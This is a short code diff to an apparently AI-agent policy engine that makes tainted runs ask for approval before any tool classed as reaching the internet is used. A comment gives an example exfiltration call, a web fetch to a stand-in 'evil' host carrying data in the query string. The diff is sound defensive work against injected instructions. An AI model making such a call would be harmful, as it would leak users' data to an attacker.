@@ -112,7 +112,7 @@ export class PolicyEngine {
 
     // In a tainted Run, tools that reach the internet with Bot-chosen arguments
     // could carry data out (WebFetch https://evil/?d=…): ask instead (ADR-009).
-    if (ctx.tainted && EGRESS_TOOLS.has(toolName)) {
+    if (ctx.tainted && (EGRESS_TOOLS.has(toolName) || cls.egress === true)) {
       return {
         decision: 'ask',
         tier: 'EXTERNAL',
